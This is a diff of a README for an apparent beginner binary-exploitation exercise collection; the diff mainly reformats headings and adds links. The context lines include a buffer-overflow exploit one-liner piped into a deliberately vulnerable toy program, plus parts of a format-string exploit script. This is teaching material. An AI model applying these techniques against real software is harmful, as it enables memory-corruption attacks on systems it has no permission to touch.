@@ -1,8 +1,8 @@
-### Easy Category :> Binary Exploitation
+# Easy Category :> Binary Exploitation
 - This category contains simple programs i have written to demonstrate basic techniques in binary explotation .
 - It covers the main topics but with most security features turned off.  Enjoy :D
 
-#### bof
+## bof
 - This are the files <a href="./bof">here</a>
 ``` 
 #include <stdio.h>
@@ -55,7 +55,7 @@ python3 -c"import struct;print(b'A'*40 + struct.pack('<I',0xdeadbeed))" > exploi
 cat exploit1 | ./pwn
 wiiiih :)
 ```
-#### format string
+## format string
 - This are the files <a href="./string_format">here</a>
 ```
 ➜  string_format git:(master) ✗ cat pwn.c
@@ -127,5 +127,10 @@ def exploit():
 if __name__ == "__main__":
         exploit()
 ```
+## Buffer\_yt
+	- files <a href="./Buffer_yt">here</a>
+## Jump\_yt
+	- files <a href="./Jump_yt">here</a>
+
 Happy hacking :D
 wiiih  :)
